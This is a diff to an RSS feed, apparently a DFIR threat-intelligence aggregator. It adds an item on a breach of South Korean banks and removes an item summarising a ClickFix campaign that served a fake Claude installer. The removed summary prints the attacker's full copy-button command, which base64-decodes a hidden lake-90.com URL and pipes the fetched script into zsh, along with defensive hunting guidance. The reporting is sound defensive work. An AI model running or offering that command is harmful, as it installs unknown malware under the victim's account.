@@ -5,8 +5,22 @@
     <link>https://x.com/DFIR_Radar</link>
     <description>Keeping DFIR Intelligence on your Radar. The latest DFIR research from hundreds of sources, ranked by relevance for practitioners.</description>
     <language>en</language>
-    <lastBuildDate>Sat, 17 Oct 2026 19:03:01 +0000</lastBuildDate>
+    <lastBuildDate>Sat, 17 Oct 2026 20:03:53 +0000</lastBuildDate>
     <atom:link href="https://falhumaid.github.io/DFIR_Radar_RSS/rss.xml" rel="self" type="application/rss+xml"/>
+    <item>
+      <title>TAG-217 Targets South Korean Financial Services with ARTEX</title>
+      <link>https://www.recordedfuture.com/blog/tag-217-artex-south-korean-banks</link>
+      <description>TAG-217, a suspected Chinese-speaking actor, breached seven South Korean 🇰🇷 financial institutions via ARTEX, exposing 68,000 records.
+
+#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2111548774694678786</description>
+      <content:encoded><![CDATA[<p>TAG-217, a suspected Chinese-speaking actor, breached seven South Korean 🇰🇷 financial institutions via ARTEX, exposing 68,000 records.</p><p>#DFIR_Radar</p><p><a href="https://www.recordedfuture.com/blog/tag-217-artex-south-korean-banks">Read the report</a> | <a href="https://x.com/DFIR_Radar/status/2111548774694678786">View on X</a></p>]]></content:encoded>
+      <dc:creator>Recorded Future</dc:creator>
+      <comments>https://x.com/DFIR_Radar/status/2111548774694678786</comments>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2111548774694678786">DFIR Radar</source>
+      <pubDate>Sat, 17 Oct 2026 20:03:53 +0000</pubDate>
+      <guid isPermaLink="false">2111548774694678786</guid>
+    </item>
     <item>
       <title>Stolen AI API keys are paying for hackers’ autonomous scans</title>
       <link>https://www.helpnetsecurity.com/2026/10/16/stolen-ai-api-keys-autonomous-scans/</link>
@@ -2462,32 +2476,6 @@ Practitioners: do not rely on the Ivanti Integrity Checker to rule out compromis
       <source url="https://x.com/DFIR_Radar/status/2110040542620909953">DFIR Radar</source>
       <pubDate>Tue, 13 Oct 2026 16:10:43 +0000</pubDate>
       <guid isPermaLink="false">2110040542620909953</guid>
-    </item>
-    <item>
-      <title>AI Security Incident Case: Fake Claude Installation Page Delivered Malware via ClickFix</title>
-      <link>https://nsfocusglobal.com/ai-security-incident-case-fake-claude-installation-page-delivered-malware-via-clickfix/</link>
-      <description>ClickFix malvertising campaign abused Google Ads and Bing's own redirect infrastructure to deliver a fake Claude installer to macOS users, with two-layer cloaking that blocked every automated scanner from seeing the payload.
-
-Key details:
-
-- The redirect chain runs four hops: Google's ad click redirect (302) to a Bing click-tracking URL at bing[.]com/ck/a (200, JavaScript-forwarded, leaving a bing[.]com referrer), then to a compromised South American retailer's "About us" page at homeopatiaalemana[.]com/quienes-somos/ (302), and finally to the fake Claude site at claude-desk-code[.]com (200). Ad platform reviewers only ever saw bing[.]com as the landing domain, because Bing's own tracking redirect is a legitimate, recognizable URL.
-
-- Two cloaking layers protected the payload from analysis. The first lives server-side on the compromised WordPress retailer: it checks for a Bing referrer plus valid browser headers and returns a 302 to the next hop only when both are present. The second lives on the fake Claude site as JavaScript that reads document.referrer and redirects any visit without a Google or Bing referrer to /404.html. Sandboxes and URL scanners hitting either URL directly receive a 404, making sample capture through automated tooling effectively impossible.
-
-- The clipboard deception is the core ClickFix mechanic here. The page displays Anthropic's real command (curl -fsSL hxxps://claude[.]ai/install.sh | bash) so the user reads something legitimate. The Copy button writes an entirely different command: echo "Downloading Claude: hxxps://claude[.]ai/install.sh" &amp;&amp; curl -s $(echo "aHR0cHM6Ly9sYWtlLTkwLmNvbS9jdXJsL2luaGd1cDlhL2E5MGZrYnFkZzhkMG11czY0b2g4ZHcuZGF0" | openssl base64 -d -A) | zsh. The terminal prints a believable Claude URL before base64-decoding a hidden address at lake-90[.]com and piping the fetched script directly into zsh under the victim's own account permissions.
-
-- Push Security groups the infrastructure behind this campaign under the toolchain name AcSig, noting consistent macOS command patterns, payload URL structures, and installation popup code across related domains, suggesting a mature operation capable of swapping domains at scale. The final payload remains unconfirmed, which complicates targeted remediation and damage assessment for any macOS users who executed the command.
-
-Practitioner takeaway: Domain reputation blocking fails completely here because every hop is a legitimate domain. The forensic opportunity sits at the endpoint: look for zsh or bash processes spawned from a terminal session that made an outbound curl or fetch to lake-90[.]com, and cross-reference with clipboard write events captured by browser or endpoint telemetry. On macOS, shell history files (~/.zsh_history, ~/.bash_history) and the unified log (subsystem com[.]apple.bash or com[.]apple.zsh) may retain the full decoded command even if the user did not notice what ran. Hunt for base64 decode operations chained with pipe-to-shell patterns in process telemetry. IOCs and campaign detail are in the Push Security report.
-
-#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2110027528911962222</description>
-      <content:encoded><![CDATA[<p>ClickFix malvertising campaign abused Google Ads and Bing&#x27;s own redirect infrastructure to deliver a fake Claude installer to macOS users, with two-layer cloaking that blocked every automated scanner from seeing the payload.</p><p>Key details:</p><p>- The redirect chain runs four hops: Google&#x27;s ad click redirect (302) to a Bing click-tracking URL at bing[.]com/ck/a (200, JavaScript-forwarded, leaving a bing[.]com referrer), then to a compromised South American retailer&#x27;s &quot;About us&quot; page at homeopatiaalemana[.]com/quienes-somos/ (302), and finally to the fake Claude site at claude-desk-code[.]com (200). Ad platform reviewers only ever saw bing[.]com as the landing domain, because Bing&#x27;s own tracking redirect is a legitimate, recognizable URL.</p><p>- Two cloaking layers protected the payload from analysis. The first lives server-side on the compromised WordPress retailer: it checks for a Bing referrer plus valid browser headers and returns a 302 to the next hop only when both are present. The second lives on the fake Claude site as JavaScript that reads document.referrer and redirects any visit without a Google or Bing referrer to /404.html. Sandboxes and URL scanners hitting either URL directly receive a 404, making sample capture through automated tooling effectively impossible.</p><p>- The clipboard deception is the core ClickFix mechanic here. The page displays Anthropic&#x27;s real command (curl -fsSL hxxps://claude[.]ai/install.sh | bash) so the user reads something legitimate. The Copy button writes an entirely different command: echo &quot;Downloading Claude: hxxps://claude[.]ai/install.sh&quot; &amp;&amp; curl -s $(echo &quot;aHR0cHM6Ly9sYWtlLTkwLmNvbS9jdXJsL2luaGd1cDlhL2E5MGZrYnFkZzhkMG11czY0b2g4ZHcuZGF0&quot; | openssl base64 -d -A) | zsh. The terminal prints a believable Claude URL before base64-decoding a hidden address at lake-90[.]com and piping the fetched script directly into zsh under the victim&#x27;s own account permissions.</p><p>- Push Security groups the infrastructure behind this campaign under the toolchain name AcSig, noting consistent macOS command patterns, payload URL structures, and installation popup code across related domains, suggesting a mature operation capable of swapping domains at scale. The final payload remains unconfirmed, which complicates targeted remediation and damage assessment for any macOS users who executed the command.</p><p>Practitioner takeaway: Domain reputation blocking fails completely here because every hop is a legitimate domain. The forensic opportunity sits at the endpoint: look for zsh or bash processes spawned from a terminal session that made an outbound curl or fetch to lake-90[.]com, and cross-reference with clipboard write events captured by browser or endpoint telemetry. On macOS, shell history files (~/.zsh_history, ~/.bash_history) and the unified log (subsystem com[.]apple.bash or com[.]apple.zsh) may retain the full decoded command even if the user did not notice what ran. Hunt for base64 decode operations chained with pipe-to-shell patterns in process telemetry. IOCs and campaign detail are in the Push Security report.</p><p>#DFIR_Radar</p><p><a href="https://nsfocusglobal.com/ai-security-incident-case-fake-claude-installation-page-delivered-malware-via-clickfix/">Read the report</a> | <a href="https://x.com/DFIR_Radar/status/2110027528911962222">View on X</a></p>]]></content:encoded>
-      <dc:creator>NSFOCUS</dc:creator>
-      <comments>https://x.com/DFIR_Radar/status/2110027528911962222</comments>
-      <category>THREAT INTELLIGENCE</category>
-      <source url="https://x.com/DFIR_Radar/status/2110027528911962222">DFIR Radar</source>
-      <pubDate>Tue, 13 Oct 2026 15:19:00 +0000</pubDate>
-      <guid isPermaLink="false">2110027528911962222</guid>
     </item>
   </channel>
 </rss>
